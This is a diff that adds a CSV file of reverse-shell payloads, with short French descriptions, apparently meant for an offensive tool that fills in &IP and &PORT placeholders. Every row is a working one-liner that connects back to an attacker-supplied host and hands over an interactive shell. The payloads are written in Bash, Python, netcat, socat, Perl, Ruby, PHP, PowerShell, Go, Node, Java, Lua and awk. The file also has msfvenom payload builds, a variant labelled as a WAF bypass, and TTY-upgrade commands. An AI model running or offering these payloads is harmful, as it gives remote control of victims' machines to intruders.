@@ -1,0 +1,46 @@
+payload,description
+bash -i >& /dev/tcp/&IP/&PORT 0>&1,Bash TCP — redirection complète
+0<&196;exec 196<>/dev/tcp/&IP/&PORT; sh <&196 >&196 2>&196,Bash TCP — fd 196
+/bin/bash -l > /dev/tcp/&IP/&PORT 0<&1 2>&1,Bash TCP — login shell
+sh -i >& /dev/udp/&IP/&PORT 0>&1,Bash UDP
+bash -c 'exec bash -i &>/dev/tcp/&IP/&PORT <&1',Bash TCP — exec subshell
+"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((""&IP"",&PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")'",Python3 — dup2+pty spawn
+"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((""&IP"",&PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",Python3 — subprocess.call
+"python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""&IP"",&PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(""/bin/sh"")'",Python2 — dup2+pty spawn
+"python3 -c 'a=__import__;s=a(""socket"").socket;o=a(""os"").dup2;p=a(""pty"").spawn;c=s();c.connect((""&IP"",&PORT));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(""/bin/sh"")'",Python3 — no spaces (WAF bypass)
+nc -e /bin/sh &IP &PORT,Netcat traditionnel — -e /bin/sh
+nc -e /bin/bash &IP &PORT,Netcat traditionnel — -e /bin/bash
+nc -c bash &IP &PORT,Netcat — -c bash
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc &IP &PORT >/tmp/f,Netcat OpenBSD — mkfifo
+rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc &IP &PORT >/tmp/f,Netcat BusyBox — mknod
+ncat &IP &PORT -e /bin/bash,Ncat — -e bash
+ncat --udp &IP &PORT -e /bin/bash,Ncat UDP
+"perl -e 'use Socket;$i=""&IP"";$p=&PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'",Perl — socket connect /bin/sh
+"perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,""&IP:&PORT"");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",Perl — IO::Socket fork
+"ruby -rsocket -e'f=TCPSocket.open(""&IP"",&PORT).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",Ruby — TCPSocket exec sprintf
+"ruby -rsocket -e'exit if fork;c=TCPSocket.new(""&IP"",""&PORT"");loop{c.gets.chomp!;($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts ""failed: #{$_}""}'",Ruby — fork+loop cmd
+"php -r '$sock=fsockopen(""&IP"",&PORT);exec(""/bin/sh -i <&3 >&3 2>&3"");'",PHP CLI — fsockopen exec fd3
+"php -r '$sock=fsockopen(""&IP"",&PORT);$proc=proc_open(""/bin/sh"",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'",PHP CLI — fsockopen proc_open
+"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:&IP:&PORT",Socat — bash PTY full interactive
+"/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:&IP:&PORT",Socat — depuis /tmp (upload)
+socat tcp-connect:&IP:&PORT exec:'bash -li',Socat — tcp-connect bash
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect &IP:&PORT > /tmp/s; rm /tmp/s,OpenSSL — shell chiffré TLS
+"powershell -NoP -NonI -W Hidden -Exec Bypass -Command ""$client=New-Object System.Net.Sockets.TCPClient('&IP',&PORT);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""",PowerShell — TCPClient full (Windows)
+"powershell -nop -c ""$client=New-Object System.Net.Sockets.TCPClient('&IP',&PORT);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""",PowerShell — TCPClient v2 (Windows)
+"echo 'package main;import""os/exec"";import""net"";func main(){c,_:=net.Dial(""tcp"",""&IP:&PORT"");cmd:=exec.Command(""/bin/sh"");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",Golang — compile+run+cleanup
+"node -e ""require('child_process').exec('bash -i >& /dev/tcp/&IP/&PORT 0>&1')""",NodeJS — child_process bash TCP
+"node -e ""var net=require('net'),sh=require('child_process').spawn('/bin/sh',[]);var c=new net.Socket();c.connect(&PORT,'&IP',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});""",NodeJS — net.Socket pipe /bin/sh
+"Runtime r=Runtime.getRuntime();Process p=r.exec(""/bin/bash -c 'exec 5<>/dev/tcp/&IP/&PORT;cat <&5 | while read line; do $line 2>&5 >&5; done'"");p.waitFor();",Java — Runtime.exec bash TCP (servlet/OGNL)
+"lua -e ""require('socket');require('os');t=socket.tcp();t:connect('&IP','&PORT');os.execute('/bin/sh -i <&3 >&3 2>&3');""",Lua — socket.tcp exec
+"awk 'BEGIN {s = ""/inet/tcp/0/&IP/&PORT""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",Awk — /inet/tcp reverse shell
+telnet &IP 8080 | /bin/sh | telnet &IP &PORT,Telnet — dual listener (8080+&PORT)
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=&IP LPORT=&PORT -f elf -o /tmp/shell.elf,MSFVenom — Linux ELF x64
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=&IP LPORT=&PORT -f elf -o /tmp/shell.elf,MSFVenom — Linux ELF x86
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&IP LPORT=&PORT -f exe -o shell.exe,MSFVenom — Windows EXE x64
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&IP LPORT=&PORT -f war > reverse.war,MSFVenom — Java WAR (Tomcat)
+msfvenom -p php/reverse_php LHOST=&IP LPORT=&PORT -f raw > shell.php,MSFVenom — PHP raw
+"python3 -c 'import pty;pty.spawn(""/bin/bash"")'",Upgrade TTY — pty.spawn bash
+"python -c 'import pty;pty.spawn(""/bin/bash"")'",Upgrade TTY — python2
+script -qc /bin/bash /dev/null,Upgrade TTY — script
+stty raw -echo; fg,Upgrade TTY — stty raw (après Ctrl+Z)
+export TERM=xterm-256color; export SHELL=bash,Upgrade TTY — export TERM SHELL
